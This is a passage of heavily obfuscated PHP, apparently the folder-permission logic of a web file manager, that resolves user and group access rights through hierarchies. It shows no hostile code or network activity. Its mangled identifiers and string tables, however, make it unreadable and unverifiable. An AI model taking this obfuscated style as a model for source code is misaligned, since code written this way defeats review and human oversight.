($àœ‹ÊÆš[$éÂĞ¼¡ø[1809]]) { if ($this->groupContainUser($àœ‹ÊÆš[$éÂĞ¼¡ø[1809]], $Ôâ×£…ˆ)) { $ëŸŠ¬­ = !0; break; } } } if ($ëŸŠ¬­) { $Ó´ãÇ±Ñ[] = $´øğÊ€™; } $Œ ‹ŒĞ™ = $´øğÊ€™[$éÂĞ¼¡ø[396]]; if (isset($ô¨¶‰ªÛ[$Œ ‹ŒĞ™])) { $´øğÊ€™[$éÂĞ¼¡ø[1984]][] = $ô¨¶‰ªÛ[$Œ ‹ŒĞ™][0]; $ô¨¶‰ªÛ[$Œ ‹ŒĞ™] = !1; } } $ô¨¶‰ªÛ = array_filter(array_values($ô¨¶‰ªÛ)); $Ó´ãÇ±Ñ = array_merge($ô¨¶‰ªÛ, $Ó´ãÇ±Ñ); return $Ó´ãÇ±Ñ; } public function setAllChildrenByUser($¼Á—ûî, $‚£…óê©, $«ã“ÑÍ…) { $€¬˜Ø…Ñ =& $_SERVER[ê‘³Æ±]; $Åğ‚ = $this->getAllChildrenByUser($¼Á—ûî, $‚£…óê©); if (!$«ã“ÑÍ… || !$Åğ‚) { return !1; } foreach ($Åğ‚ as $Ş»¸®ñ) { $ö…ûø£õ = array(); foreach ($Ş»¸®ñ[$€¬˜Ø…Ñ[1984]] as $à‘Ğ£ß) { $Üç‰Ê…Ö = $à‘Ğ£ß[$€¬˜Ø…Ñ[459]]; $ß¾©Ï¼‰ = $à‘Ğ£ß[$€¬˜Ø…Ñ[1641]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ê¤å…’ = $à‘Ğ£ß[$€¬˜Ø…Ñ[1641]] ? $à‘Ğ£ß[$€¬˜Ø…Ñ[1641]] : $à‘Ğ£ß[$€¬˜Ø…Ñ[1809]]; if ($à‘Ğ£ß[$€¬˜Ø…Ñ[1641]] && $à‘Ğ£ß[$€¬˜Ø…Ñ[1641]] == $‚£…óê©) { continue; } $ö…ûø£õ[] = array($€¬˜Ø…Ñ[396] => $Ş»¸®ñ[$€¬˜Ø…Ñ[396]], $€¬˜Ø…Ñ[405] => $ß¾©Ï¼‰, $€¬˜Ø…Ñ[498] => intval($ê¤å…’), $€¬˜Ø…Ñ[1910] => isset($Üç‰Ê…Ö[$€¬˜Ø…Ñ[394]]) ? intval($Üç‰Ê…Ö[$€¬˜Ø…Ñ[394]]) : 0, $€¬˜Ø…Ñ[1964] => isset($Üç‰Ê…Ö[$€¬˜Ø…Ñ[1964]]) ? intval($Üç‰Ê…Ö[$€¬˜Ø…Ñ[1964]]) : -1); } $ö…ûø£õ[] = array($€¬˜Ø…Ñ[396] => $Ş»¸®ñ[$€¬˜Ø…Ñ[396]], $€¬˜Ø…Ñ[405] => SourceModel::TYPE_USER, $€¬˜Ø…Ñ[498] => intval($‚£…óê©), $€¬˜Ø…Ñ[1910] => intval($«ã“ÑÍ…), $€¬˜Ø…Ñ[1964] => -1); $this->where(array($€¬˜Ø…Ñ[411] => $Ş»¸®ñ[$€¬˜Ø…Ñ[396]]))->delete(); $this->addAll($ö…ûø£õ); } return !0; } public function get($Ø–İï§) { $‹½¥‘¥Ğ = $this->getSourceList(array($Ø–İï§), !0); return $‹½¥‘¥Ğ[0]; } public function getSourceList($ˆıŞÊ†ä, $«òù¿Ÿğ = false, $ÏŞ”ÒØ  = false) { $“ÖÀ«˜ =& $_SERVER[ê‘³Æ±]; if (!$ˆıŞÊ†ä) { return array(); } $œ™µ˜ÙÕ = Model($“ÖÀ«˜[1314]); if (!$«òù¿Ÿğ && count($ˆıŞÊ†ä) == 1) { $«òù¿Ÿğ = array(); $«òù¿Ÿğ[$ˆıŞÊ†ä[0]] = $œ™µ˜ÙÕ->sourceInfo($ˆıŞÊ†ä[0]); } if (!$«òù¿Ÿğ) { $ââİô§Û = array($“ÖÀ«˜[411] => array($“ÖÀ«˜[412], $ˆıŞÊ†ä)); $«òù¿Ÿğ = $œ™µ˜ÙÕ->field($“ÖÀ«˜[1988])->where($ââİô§Û)->select(); $«òù¿Ÿğ = array_to_keyvalue($«òù¿Ÿğ, $“ÖÀ«˜[396]); } $•Û‘¥Œ = $ˆıŞÊ†ä; foreach ($«òù¿Ÿğ as $¢¢Ì‡¸ı => $›ûšù×) { $¦ÉÃºşí = $œ™µ˜ÙÕ->parentLevelArray($›ûšù×[$“ÖÀ«˜[514]]); $•Û‘¥Œ = array_merge($•Û‘¥Œ, array($¢¢Ì‡¸ı), array_reverse($¦ÉÃºşí)); } $•Û‘¥Œ = array_values(array_unique($•Û‘¥Œ)); if (!$•Û‘¥Œ) { return array(); } $âË±½Î½ = $this->sourceAuthSelect($•Û‘¥Œ); $ï„Œî‰ù = array(); foreach ($•Û‘¥Œ as $êÖ–à€Ş) { if (isset($âË±½Î½[$êÖ–à€Ş])) { $ï„Œî‰ù[$êÖ–à€Ş] = $âË±½Î½[$êÖ–à€Ş]; } } $Â˜å‘»Ÿ = $this->userIsRoot($ÏŞ”ÒØ ); $¹…óÕ¸î = AuthModel::authAll(); $–µ“í§Ê = array($“ÖÀ«˜[408] => $¹…óÕ¸î, $“ÖÀ«˜[1989] => array($“ÖÀ«˜[413] => 0, $“ÖÀ«˜[1815] => $¹…óÕ¸î, $“ÖÀ«˜[414] => LNG($“ÖÀ«˜[1990]), $“ÖÀ«˜[1831] => $“ÖÀ«˜[1991])); $»åŠİõÒ = array(); foreach ($«òù¿Ÿğ as $êÖ–à€Ş => $øûõ°ôğ) { if ($Â˜å‘»Ÿ) { $»åŠİõÒ[$êÖ–à€Ş] = $–µ“í§Ê; continue; } $»åŠİõÒ[$êÖ–à€Ş] = $this->makeSourceAuth($øûõ°ôğ, $ï„Œî‰ù, $ÏŞ”ÒØ ); } return $»åŠİõÒ; } public function authDeepCheck($ˆ³Áé‚¿, $Ô¨Ö‚÷ = false) { $®¢±ÕòÅ =& $_SERVER[ê‘³Æ±]; $Ô¨Ö‚÷ = $Ô¨Ö‚÷ ? $Ô¨Ö‚÷ : USER_ID; $ƒµçôÆ• = $this->makeAuthDeep($Ô¨Ö‚÷); if (!in_array($ˆ³Áé‚¿, $ƒµçôÆ•[$®¢±ÕòÅ[1992]])) { return !1; } $›× ¯ö = array(); foreach ($ƒµçôÆ•[$®¢±ÕòÅ[1993]] as $ÀÌ€†ª¼ => $‘è¹êß) { if (!in_array($ˆ³Áé‚¿, $‘è¹êß)) { continue; } $›× ¯ö[] = $ÀÌ€†ª¼; } if (!$›× ¯ö) { return !1; } $†Øñ‚” = $›× ¯ö ? $›× ¯ö[0] : $ˆ³Áé‚¿; return array($®¢±ÕòÅ[408] => -1, $®¢±ÕòÅ[459] => array($®¢±ÕòÅ[413] => $®¢±ÕòÅ[1177], $®¢±ÕòÅ[1815] => $®¢±ÕòÅ[192], $®¢±ÕòÅ[414] => LNG($®¢±ÕòÅ[1994]), $®¢±ÕòÅ[1831] => $®¢±ÕòÅ[1995]), $®¢±ÕòÅ[1996] => LNG($®¢±ÕòÅ[1997]), $®¢±ÕòÅ[1998] => $this->sourceAuthInfo($†Øñ‚”)); } protected function makeAuthDeep($ÒÆ”·‹ù = false) { $ÓÁÓ˜Æç =& $_SERVER[ê‘³Æ±]; static $½Â¢ŒãÓ = array(); $ÒÆ”·‹ù = $ÒÆ”·‹ù ? $ÒÆ”·‹ù : USER_ID; if (isset($½Â¢ŒãÓ[$ÒÆ”·‹ù])) { return $½Â¢ŒãÓ[$ÒÆ”·‹ù]; } $•§şËÊ = Model($ÓÁÓ˜Æç[1999])->listData(); $™Îèùïı = array(); foreach ($•§şËÊ as $´«Ùü²) { if ($´«Ùü²[$ÓÁÓ˜Æç[407]] == 0 && $´«Ùü²[$ÓÁÓ˜Æç[1830]] == $ÓÁÓ˜Æç[89]) { $™Îèùïı[] = $´«Ùü²[$ÓÁÓ˜Æç[394]]; } } $à¥Êññ = $this->userGroupParents($ÒÆ”·‹ù); $Ó©§İéö = array($ÓÁÓ˜Æç[405] => SourceModel::TYPE_USER, $ÓÁÓ˜Æç[498] => $ÒÆ”·‹ù); if ($à¥Êññ) { $Ó©§İéö = array(array($ÓÁÓ˜Æç[405] => SourceModel::TYPE_USER, $ÓÁÓ˜Æç[498] => $ÒÆ”·‹ù), array($ÓÁÓ˜Æç[405] => SourceModel::TYPE_GROUP, $ÓÁÓ˜Æç[498] => array($ÓÁÓ˜Æç[412], $à¥Êññ)), $ÓÁÓ˜Æç[989] => $ÓÁÓ˜Æç[1904]); } $ÉçşçÔ÷ = $this->field($ÓÁÓ˜Æç[2000])->where($Ó©§İéö)->select(); $Ğı¶¼ÖĞ = array(); $³˜Š€‚¾ = array_to_keyvalue_group($ÉçşçÔ÷, $ÓÁÓ˜Æç[396]); foreach ($³˜Š€‚¾ as $İ·Áî—í => $ÜÛ¯¡áä) { $·«ÍÜÇ± = $this->authArrayCheck($ÜÛ¯¡áä, $ÒÆ”·‹ù); if ($·«ÍÜÇ±[$ÓÁÓ˜Æç[408]] > 0) { $Ğı¶¼ÖĞ[] = $İ·Áî—í . $ÓÁÓ˜Æç[12]; } } if ($à¥Êññ) { $âì÷Š®± = Model($ÓÁÓ˜Æç[515]); foreach ($à¥Êññ as $„İ¶ûÉ) { $ë¸¸÷”é = $âì÷Š®±->getInfo($„İ¶ûÉ); if (!$ë¸¸÷”é || !is_array($ë¸¸÷”é[$ÓÁÓ˜Æç[87]])) { continue; } $Ğı¶¼ÖĞ[] = $ë¸¸÷”é[$ÓÁÓ˜Æç[87]][$ÓÁÓ˜Æç[396]]; } } $ôßÔšÌ = array(); $§ı´ôÄ = $à¥Êññ; $üšì¦Î¹ = Model($ÓÁÓ˜Æç[1314]); $âì÷Š®± = Model($ÓÁÓ˜Æç[515]); $’Ÿ¤»¨¬ = array(); $ú…µÙØá = array(); $¦îùÖÍ° = array(); $¼›¤ëÖ = array(); if ($Ğı¶¼ÖĞ) { $éÃ×‘öÌ = $üšì¦Î¹->where(array($ÓÁÓ˜Æç[396] => array($ÓÁÓ˜Æç[412], $Ğı¶¼ÖĞ)))->select(); foreach ($éÃ×‘öÌ as $À‡ôÄ«¹) { $ğ§Ì”³ = $üšì¦Î¹->parentLevelArray($À‡ôÄ«¹[$ÓÁÓ˜Æç[514]]); $ôßÔšÌ = array_merge($ôßÔšÌ, $ğ§Ì”³); $§ı´ôÄ[] = $À‡ôÄ«¹[$ÓÁÓ˜Æç[498]]; $’Ÿ¤»¨¬[$À‡ôÄ«¹[$ÓÁÓ˜Æç[396]]] = $ğ§Ì”³; $ú…µÙØá[$À‡ôÄ«¹[$ÓÁÓ˜Æç[396]]] = $À‡ôÄ«¹[$ÓÁÓ˜Æç[498]]; } } $§ı´ôÄ = array_values(array_unique($§ı´ôÄ)); $ØÅÒå¿› = $§ı´ôÄ; foreach ($ØÅÒå¿› as $„İ¶ûÉ) { $ë¸¸÷”é = $âì÷Š®±->getInfo($„İ¶ûÉ); $ğ§Ì”³ = $üšì¦Î¹->parentLevelArray($ë¸¸÷”é[$ÓÁÓ˜Æç[514]]); $§ı´ôÄ = array_merge($§ı´ôÄ, $ğ§Ì”³); } $§ı´ôÄ = array_values(array_unique($§ı´ôÄ)); foreach ($§ı´ôÄ as $„İ¶ûÉ) { $ë¸¸÷”é = $âì÷Š®±->getInfo($„İ¶ûÉ); $ôßÔšÌ[] = $ë¸¸÷”é[$ÓÁÓ˜Æç[87]][$ÓÁÓ˜Æç[396]]; $¦îùÖÍ°[$„İ¶ûÉ] = $ë¸¸÷”é[$ÓÁÓ˜Æç[87]][$ÓÁÓ˜Æç[396]]; $¼›¤ëÖ[$„İ¶ûÉ] = $üšì¦Î¹->parentLevelArray($ë¸¸÷”é[$ÓÁÓ˜Æç[514]]); } foreach ($’Ÿ¤»¨¬ as $”ãÍÖĞÂ => $»ïá”¢) { $³âæºº¡ = $ú…µÙØá[$”ãÍÖĞÂ]; if (!$³âæºº¡ || !$¦îùÖÍ°[$³âæºº¡]) { continue; } $›¯ä£å— = array(); foreach ($¼›¤ëÖ[$³âæºº¡] as $„İ¶ûÉ) { $›¯ä£å—[] = $¦îùÖÍ°[$„İ¶ûÉ]; } $’Ÿ¤»¨¬[$”ãÍÖĞÂ] = array_merge($›¯ä£å—, $»ïá”¢); } $ôßÔšÌ = array_values(array_unique($ôßÔšÌ)); $¬Œíòã£ = array($ÓÁÓ˜Æç[1992] => $ôßÔšÌ, $ÓÁÓ˜Æç[1993] => $’Ÿ¤»¨¬); $½Â¢ŒãÓ[$ÒÆ”·‹ù] = $¬Œíòã£; return $¬Œíòã£; } private function makeSourceAuth($šßêô½É, $éª±„ø, $ØÏøáùŞ = false) { $çä•æóë =& $_SERVER[ê‘³Æ±]; $ÚúÄÅˆ† = $çä•æóë[89]; $ê±Û°‹Å = $šßêô½É[$çä•æóë[498]]; $—ş°—±ã = $šßêô½É[$çä•æóë[405]] == SourceModel::TYPE_GROUP; $öò¬™¬‹ = $—ş°—±ã ? $this->groupRootAuth($ê±Û°‹Å, $ØÏøáùŞ) : !1; if ($öò¬™¬‹ && Model($çä•æóë[500])->authCheckAction($öò¬™¬‹[$çä•æóë[407]], $çä•æóë[1829])) { return $this->groupAuthInfo($öò¬™¬‹, $ê±Û°‹Å); } $‹³ºüöª = Model($çä•æóë[1314])->parentLevelArray($šßêô½É[$çä•æóë[514]]); $‹³ºüöª = array_merge(array($šßêô½É[$çä•æóë[396]]), array_reverse($‹³ºüöª)); $Ô’„èŸô = !1; foreach ($‹³ºüöª as $åöìñÆÜ) { if (!isset($éª±„ø[$åöìñÆÜ])) { continue; } $£óÓÚŞÉ = $this->authMake($éª±„ø[$åöìñÆÜ], $ØÏøáùŞ); if ($£óÓÚŞÉ[$çä•æóë[459]]) { $Ô’„èŸô = $£óÓÚŞÉ; break; } } if (!$—ş°—±ã) { return $Ô’„èŸô; } if (!$Ô’„èŸô && $öò¬™¬‹) { $Ô’„èŸô = $this->groupAuthInfo($öò¬™¬‹, $ê±Û°‹Å); } if (!$Ô’„èŸô) { $¢ò’Îø = Model($çä•æóë[515])->getInfo($ê±Û°‹Å); $£•ö­ğĞ = explode($çä•æóë[50], trim($¢ò’Îø[$çä•æóë[514]], $çä•æóë[50])); $£•ö­ğĞ = array_reverse($£•ö­ğĞ); foreach ($£•ö­ğĞ as $¢æÈ®ŞÜ) { if ($¢æÈ®ŞÜ == $çä•æóë[192] || $¢æÈ®ŞÜ == $ÚúÄÅˆ†) { continue; } $¾ş”‚æ = $this->groupRootAuth($¢æÈ®ŞÜ, $ØÏøáùŞ); if (!$¾ş”‚æ) { continue; } $Ô’„èŸô = $this->groupAuthInfo($¾ş”‚æ, $¢æÈ®ŞÜ); break; } } if (!$Ô’„èŸô || $Ô’„èŸô[$çä•æóë[408]] <= 0) { $Æ±ˆÖ± = $this->authDeepCheck($šßêô½É[$çä•æóë[396]], $ØÏøáùŞ); if ($Æ±ˆÖ±) { $Ô’„èŸô = $Æ±ˆÖ±; } } return $Ô’„èŸô; } private function userIsRoot($ÖãÍŸ¥ş = false) { $ë›Š‘½ =& $_SERVER[ê‘³Æ±]; if (!$ÖãÍŸ¥ş && _get($GLOBALS, $ë›Š‘½[496])) { return !0; } $ Ö§İá¯ = Model($ë›Š‘½[534])->getInfo($ÖãÍŸ¥ş); $¼³Õ€§Ù = Model($ë›Š‘½[2001])->listData($ Ö§İá¯[$ë›Š‘½[1521]]); if ($¼³Õ€§Ù && $¼³Õ€§Ù[$ë›Š‘½[504]][$ë›Š‘½[2002]] == 1) { return !0; } return !1; } private function sourceAuthInfo($íÃ©¢ˆ—) { $ÕÙ¹ÕåÑ =& $_SERVER[ê‘³Æ±]; $±×Ë¢¨¬ = Model($ÕÙ¹ÕåÑ[1314]); $±§ˆ¡ŸÃ = $±×Ë¢¨¬->sourceInfo($íÃ©¢ˆ—); if (!$±§ˆ¡ŸÃ) { return !1; } $±×Ë¢¨¬->groupPathDisplay($±§ˆ¡ŸÃ); $ò¹ğÈ±À = array($±§ˆ¡ŸÃ); $ò¹ğÈ±À = $±×Ë¢¨¬->_listAppendPath($ò¹ğÈ±À); $±§ˆ¡ŸÃ = $ò¹ğÈ±À[0]; $ë¾¸íò‡ = $±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[512]]; if (isset($±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[520]])) { $ôË«èï¤ = explode($ÕÙ¹ÕåÑ[8], trim($±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[512]], $ÕÙ¹ÕåÑ[8])); array_shift($ôË«èï¤); $ë¾¸íò‡ = $±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[518]] . $ÕÙ¹ÕåÑ[2003] . implode($ÕÙ¹ÕåÑ[8], $ôË«èï¤); } return array($ÕÙ¹ÕåÑ[414] => $±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[32]], $ÕÙ¹ÕåÑ[78] => KodIO::make($±§ˆ¡ŸÃ[$ÕÙ¹ÕåÑ[396]]), $ÕÙ¹ÕåÑ[2004] => $ë¾¸íò‡); } private function groupAuthInfo($ŠğàÀ†’, $òàªòĞ‡) { $Íæ–øó¾ =& $_SERVER[ê‘³Æ±]; $¾şÔ´š¡ = Model($Íæ–øó¾[515])->getInfo($òàªòĞ‡); return array($Íæ–øó¾[2005] => intval($ŠğàÀ†’[$Íæ–øó¾[407]]), $Íæ–øó¾[1989] => $ŠğàÀ†’, $Íæ–øó¾[2006] => LNG($Íæ–øó¾[2007]), $Íæ–øó¾[1998] => array($Íæ–øó¾[414] => $¾şÔ´š¡[$Íæ–øó¾[32]], $Íæ–øó¾[78] => KodIO::make($¾şÔ´š¡[$Íæ–øó¾[87]][$Íæ–øó¾[396]]), $Íæ–øó¾[2004] => $¾şÔ´š¡[$Íæ–øó¾[519]])); } protected function groupRootAuth($îÅ³ÓşÆ, $Æ¨ø = false) { $¤®ñ¸Í¦ =& $_SERVER[ê‘³Æ±]; $Æ¨ø = $Æ¨ø ? $Æ¨ø : USER_ID; $ˆÊõ€«ø = $Æ¨ø . $¤®ñ¸Í¦[2008] . $îÅ³ÓşÆ; static $×È£ÅÈ = array(); if (isset($×È£ÅÈ[$ˆÊõ€«ø])) { return $×È£ÅÈ[$ˆÊõ€«ø]; } $œ„µş¢˜ = Model($¤®ñ¸Í¦[515])->getInfo($îÅ³ÓşÆ); $Úæ·²² = $this->userGroupList($Æ¨ø); $Ñî×™¿Ç = isset($Úæ·²²[$îÅ³ÓşÆ]) ? $Úæ·²²[$îÅ³ÓşÆ][$¤®ñ¸Í¦[407]] : !1; if ($Ñî×™¿Ç && Model($¤®ñ¸Í¦[500])->authCheckAction($Ñî×™¿Ç[$¤®ñ¸Í¦[407]], $¤®ñ¸Í¦[1829])) { $×È£ÅÈ[$ˆÊõ€«ø] = $Ñî×™¿Ç; return $Ñî×™¿Ç; } $„åÑ½¯ = $this->sourceAuthSelect($œ„µş¢˜[$¤®ñ¸Í¦[87]][$¤®ñ¸Í¦[396]]); $ÖîîÉ¡ = $„åÑ½¯ ? $this->authMake($„åÑ½¯, $Æ¨ø) : !1; $£âë‡™º = $ÖîîÉ¡ ? $ÖîîÉ¡[$¤®ñ¸Í¦[459]] : !1; $×È£ÅÈ[$ˆÊõ€«ø] = $£âë‡™º ? $£âë‡™º : $Ñî×™¿Ç; return $×È£ÅÈ[$ˆÊõ€«ø]; } public function authOwnerApply($¹Ö°ú÷’) { $¼ªÚú© =& $_SERVER[ê‘³Æ±]; if (empty($¹Ö°ú÷’[$¼ªÚú©[407]]) || isset($¹Ö°ú÷’[$¼ªÚú©[2009]]) && $¹Ö°ú÷’[$¼ªÚú©[2009]]) { return $¹Ö°ú÷’; } if (AuthModel::authCheckRoot($¹Ö°ú÷’[$¼ªÚú©[407]][$¼ªÚú©[408]])) { return $¹Ö°ú÷’; } $àçˆ÷¦ = Model($¼ªÚú©[1314])->parentLevelArray($¹Ö°ú÷’[$¼ªÚú©[514]]); $àçˆ÷¦ = array_merge(array($¹Ö°ú÷’[$¼ªÚú©[396]]), array_reverse($àçˆ÷¦)); $ªªŞÒœ = $this->sourceAuthSelect($àçˆ÷¦); $éùªø¤® = array(); $—á”¾©ˆ = array(); foreach ($ªªŞÒœ as $Ö‰Œİ‹Ê => $–øƒïŞµ) { $µƒÊĞ°Ò = $this->authFolderOwnerUser($–øƒïŞµ); $éùªø¤®[$Ö‰Œİ‹Ê] = $µƒÊĞ°Ò; $—á”¾©ˆ = array_merge($—á”¾©ˆ, $µƒÊĞ°Ò[$¼ªÚú©[590]]); if ($µƒÊĞ°Ò[$¼ªÚú©[2010]]) { break; } } if (count($—á”¾©ˆ) == 0) { $—á”¾©ˆ = $this->authFolderOwnerGroup($¹Ö°ú÷’[$¼ªÚú©[498]]); } $—á”¾©ˆ = array_unique($—á”¾©ˆ); if (AuthModel::authCheckRoot($¹Ö°ú÷’[$¼ªÚú©[407]][$¼ªÚú©[408]])) { $—á”¾©ˆ[] = USER_ID; } $¹Ö°ú÷’[$¼ªÚú©[407]][$¼ªÚú©[2011]] = Model($¼ªÚú©[506])->userListInfo($—á”¾©ˆ); return $¹Ö°ú÷’; } private function authFolderOwnerGroup($§¼¡æØ›) { $Æôî‰Ô‚ =& $_SERVER[ê‘³Æ±]; $›Ÿú˜Ë“ = Model($Æôî‰Ô‚[1898])->where(array($Æôî‰Ô‚[1809] => $§¼¡æØ›))->select(); $‰ŒÅ¹´ = array(); if (!$›Ÿú˜Ë“) { return $‰ŒÅ¹´; } foreach ($›Ÿú˜Ë“ as $Û‘íˆáÉ) { $¼é ÉÕ = $this->authInfo($Û‘íˆáÉ); if (AuthModel::authCheckRoot($¼é ÉÕ[$Æôî‰Ô‚[407]])) { $‰ŒÅ¹´[] = $Û‘íˆáÉ[$Æôî‰Ô‚[1641]]; } } return $‰ŒÅ¹´; } private function authFolderOwnerUser($øÆ‹š) { $•äˆÁò =& $_SERVER[ê‘³Æ±]; $¼¢Åæ÷æ = array(); $¤¾Ä˜æø = !1; foreach ($øÆ‹š as $°šó¨•) { $¸Šèåœå = $this->authInfo($°šó¨•); if ($°šó¨•[$•äˆÁò[498]] == $•äˆÁò[192]) { $¤¾Ä˜æø = !0; } if ($°šó¨•[$•äˆÁò[405]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¸Šèåœå[$•äˆÁò[407]])) { $¼¢Åæ÷æ[] = $°šó¨•[$•äˆÁò[498]]; } } } return array($•äˆÁò[590] => $¼¢Åæ÷æ, $•äˆÁò[2010] => $¤¾Ä˜æø); } public function authMake($Ç‹Á¦“À, $æÜÑÈæƒ = false) { $Ş‚İ²éú =& $_SERVER[ê‘³Æ±]; $…Éğ¿í¬ = $this->authArrayCheck($Ç‹Á¦“À, $æÜÑÈæƒ); if ($…Éğ¿í¬[$Ş‚İ²éú[2012]]) { $…Éğ¿í¬[$Ş‚İ²éú[2012]] = $this->sourceAuthInfo($…Éğ¿í¬[$Ş‚İ²éú[2012]]); } return $…Éğ¿í¬; } public function authArrayCheck($¾§¦şñ, $æÃÁè¾¢ = false) { $«‰õúŞ =& $_SERVER[ê‘³Æ±]; if (!$¾§¦şñ) { return array($«‰õúŞ[408] => 0, $«‰õúŞ[459] => !1); } $æÃÁè¾¢ = $æÃÁè¾¢ ? $æÃÁè¾¢ : USER_ID; $ùúèÃó¹ = 0; $ö‚±»¯§ = 0; $ìµ“¾Îï = 0; $¯ÂŸ’­ = 0; $„ó¥¤ = 0; $è¯¶¦ØØ = 0; $£Öó¸úî = 1000; $– Èªñ = 0; $åçø¯Õ = 0; $˜á¤Ä = 0; $óÎÜğÕ = 0; $íìœ‹É = array($«‰õúŞ[396] => 0); foreach ($¾§¦şñ as $íìœ‹É) { $’À¤Õë÷ = $this->authInfo($íìœ‹É); if (!$’À¤Õë÷) { continue; } $Ò±ãÂä½ = $íìœ‹É[$«‰õúŞ[498]]; $Ãø üìÉ = intval($’À¤Õë÷[$«‰õúŞ[407]]); if ($íìœ‹É[$«‰õúŞ[405]] == SourceModel::TYPE_USER && $Ò±ãÂä½ == $æÃÁè¾¢) { $ùúèÃó¹ = !0; $ìµ“¾Îï = $’À¤Õë÷; $ö‚±»¯§ = $Ãø üìÉ; } else { if ($íìœ‹É[$«‰õúŞ[405]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ò±ãÂä½, $æÃÁè¾¢)) { $¯ÂŸ’­ = !0; $š„¶´îÉ = $this->groupStepToUserGroup($Ò±ãÂä½, $æÃÁè¾¢); if ($š„¶´îÉ < $£Öó¸úî) { $£Öó¸úî = $š„¶´îÉ; $„ó¥¤ = $Ãø üìÉ; $è¯¶¦ØØ = $’À¤Õë÷; $– Èªñ = $Ò±ãÂä½; } if ($š„¶´îÉ == $£Öó¸úî && $Ãø üìÉ >= $„ó¥¤) { $„ó¥¤ = $Ãø üìÉ; $è¯¶¦ØØ = $’À¤Õë÷; $– Èªñ = $Ò±ãÂä½; } } else { if ($Ò±ãÂä½ == $«‰õúŞ[192]) { $åçø¯Õ = !0; $óÎÜğÕ = $’À¤Õë÷; $˜á¤Ä = $Ãø üìÉ; } } } } if ($ùúèÃó¹) { $Ù¦™– ¯ = $ö‚±»¯§; $’À¤Õë÷ = $ìµ“¾Îï; $˜åÌƒ…ê = LNG($«‰õúŞ[2013]); } else { if ($¯ÂŸ’­) { $Ù¦™– ¯ = $„ó¥¤; $’À¤Õë÷ = $è¯¶¦ØØ; $×èŞï‚· = Model($«‰õúŞ[515])->getInfo($– Èªñ); $˜åÌƒ…ê = $«‰õúŞ[161] . $×èŞï‚·[$«‰õúŞ[519]] . $«‰õúŞ[2014] . LNG($«‰õúŞ[2015]); } else { if ($åçø¯Õ) { $Ù¦™– ¯ = $˜á¤Ä; $’À¤Õë÷ = $óÎÜğÕ; $˜åÌƒ…ê = LNG($«‰õúŞ[1986]); } else { $Ù¦™– ¯ = 0; $’À¤Õë÷ = !1; $˜åÌƒ…ê = $«‰õúŞ[12]; } } } $®ş»äß = array($«‰õúŞ[2005] => intval($Ù¦™– ¯), $«‰õúŞ[1989] => $’À¤Õë÷, $«‰õúŞ[2006] => $˜åÌƒ…ê, $«‰õúŞ[1998] => $íìœ‹É[$«‰õúŞ[396]]); return $®ş»äß; } private function groupContainUser($Äõ‚³÷˜, $¼ŠŞËİ = false) { return in_array($Äõ‚³÷˜, $this->userGroupParents($¼ŠŞËİ)); } private function groupStepToUserGroup($Íû— ä´, $”ÍÈè’ = false) { $ÔÙ–½òÜ =& $_SERVER[ê‘³Æ±]; $ÃÒ®ëÒé = $this->userGroupList($”ÍÈè’); $ŒÂÈûû = 1000; $º’ÃÔæŒ = $GLOBALS[$ÔÙ–½òÜ[6]][$ÔÙ–½òÜ[90]][$ÔÙ–½òÜ[1909]] == 1; $­§ïø‚ = $º’ÃÔæŒ ? 3 : 2; foreach ($ÃÒ®ëÒé as $ˆ£›«™) { if ($ˆ£›«™[$ÔÙ–½òÜ[1809]] == $Íû— ä´) { return 0; } $â›Ğ·œ½ = explode($ÔÙ–½òÜ[50], trim($ˆ£›«™[$ÔÙ–½òÜ[514]], $ÔÙ–½òÜ[50])); if ($â›Ğ·œ½[0] == $ÔÙ–½òÜ[192] && count($â›Ğ·œ½) > $­§ïø‚) { $Á‡»ÖÊ = array_reverse(array_slice($â›Ğ·œ½, $­§ïø‚)); $ÈŸŸ¦Õ = array_search($Íû— ä´, $Á‡»ÖÊ); if ($ÈŸŸ¦Õ !== !1 && $ÈŸŸ¦Õ + 1 <= $ŒÂÈûû) { $ŒÂÈûû = $ÈŸŸ¦Õ + 1; } } } return $ŒÂÈûû; } private function userGroupList($Ü¸ÔÁ¨Á = false) { $ŞğúËâÍ =& $_SERVER[ê‘³Æ±]; static $Ù¥ì·‘á = array(); if (isset($Ù¥ì·‘á[$Ü¸ÔÁ¨Á])) { return $Ù¥ì·‘á[$Ü¸ÔÁ¨Á]; } $¦İ¦¯¿Å = Model($ŞğúËâÍ[534])->getInfo($Ü¸ÔÁ¨Á); $Ù¥ì·‘á[$Ü¸ÔÁ¨Á] = array_to_keyvalue($¦İ¦¯¿Å[$ŞğúËâÍ[1987]], $ŞğúËâÍ[1809]); return $Ù¥ì·‘á[$Ü¸ÔÁ¨Á]; } public function userGroupParents($ÑÏÁø‹õ) { $„¼œÇçğ =& $_SERVER[ê‘³Æ±]; static $ÔóÜö˜ª = array(); $ÑÏÁø‹õ = $ÑÏÁø‹õ ? $ÑÏÁø‹õ : USER_ID; if (isset($ÔóÜö˜ª[$ÑÏÁø‹õ])) { return $ÔóÜö˜ª[$ÑÏÁø‹õ]; } $Òëœ†ì = $this->userGroupList($ÑÏÁø‹õ); $¬•‰±Ãï = array(); $ìØ·’æ = $GLOBALS[$„¼œÇçğ[6]][$„¼œÇçğ[90]][$„¼œÇçğ[1909]] == 1; $ï¬Ÿãó¤ = $ìØ·’æ ? 3 : 2; foreach ($Òëœ†ì as $×¸Ì³) { $­ˆÑÇÑ = array($×¸Ì³[$„¼œÇçğ[1809]]); $åêÙı•ä = explode($„¼œÇçğ[50], trim($×¸Ì³[$„¼œÇçğ[514]], $„¼œÇçğ[50])); if ($åêÙı•ä[0] == $„¼œÇçğ[192] && count($åêÙı•ä) > $ï¬Ÿãó¤) { $ó¤¥Åşì = array_slice($åêÙı•ä, $ï¬Ÿãó¤); $­ˆÑÇÑ = array_merge($­ˆÑÇÑ, array_reverse($ó¤¥Åşì)); } $¬•‰±Ãï = array_merge($¬•‰±Ãï, $­ˆÑÇÑ); } $ÔóÜö˜ª[$ÑÏÁø‹õ] = array_unique($¬•‰±Ãï); return $ÔóÜö˜ª[$ÑÏÁø‹õ]; } public function authTargetInfoMake($ÆæŞÒ‹š) { $©šŸ”ô¥ =& 